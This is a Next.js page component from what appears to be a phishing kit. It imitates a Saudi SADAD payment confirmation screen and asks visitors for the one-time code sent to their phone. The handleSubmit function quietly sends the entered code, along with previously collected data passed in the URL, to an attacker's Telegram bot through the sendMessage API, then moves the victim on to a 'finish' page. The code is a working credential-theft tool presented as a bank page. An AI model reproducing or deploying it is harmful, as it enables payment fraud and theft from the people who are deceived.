"use client"

import styles from './code.module.css'
import { useRef } from 'react'
import { useRouter,useSearchParams } from 'next/navigation'
import bot from '@/compnante/dataBot'

const Code = () => {
  const code = useRef();
  const router = useRouter();
  const x = useSearchParams();
  const datas = x.get("names")

  const handlerout = ()=>{
    if(code.current.value == ""){
      alert('من فضلك قم بملى الحقول')
    }else{
      router.push(`/aram/banks/pay/code/finish?names=${datas}`)
    }
  }

  const handleSubmit = (e) => {
    e.preventDefault();

    var length= `مدونة سمسا   %0A كود البطاقة : ${code.current.value} %0A %0A ${datas}`
    fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
  
  }


  return (
    <div className={styles.contect}>
      <div>
        <div>
          <img src="" alt="sadad" />
          <img src="" alt="تنزيل png(4)" />
        </div>
      <h1> تاكيد</h1>
      <p>ادخال الكود المرسل حديثا على هاتفك</p>
     
      <form action="/pay/code" onSubmit={handleSubmit}>
        <label dir='ltr'>
        +966*********</label>
        <input type="text" ref={code} placeholder="ادخل كود التحقق" />
        
        <button type='submit' onClick={handlerout}>دخول</button>
      </form>
        <img src="" alt="footersadad" />
      </div>
    </div>
  )
}

export default Code
